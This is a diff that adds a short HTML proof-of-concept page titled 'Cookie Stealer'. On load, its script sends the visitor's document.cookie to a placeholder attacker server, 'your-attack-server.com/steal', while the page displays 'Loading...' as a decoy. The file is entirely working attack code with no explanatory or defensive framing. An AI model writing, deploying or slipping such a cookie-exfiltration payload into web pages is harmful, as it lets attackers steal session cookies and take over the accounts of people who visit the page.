@@ -1,0 +1,14 @@
+<!-- Cookie Stealer PoC -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Stealer</title>
+    <script>
+        // Send cookies to an attacker's server
+        fetch('https://your-attack-server.com/steal?cookie=' + document.cookie);
+    </script>
+</head>
+<body>
+    <h2>Loading...</h2>
+</body>
+</html>
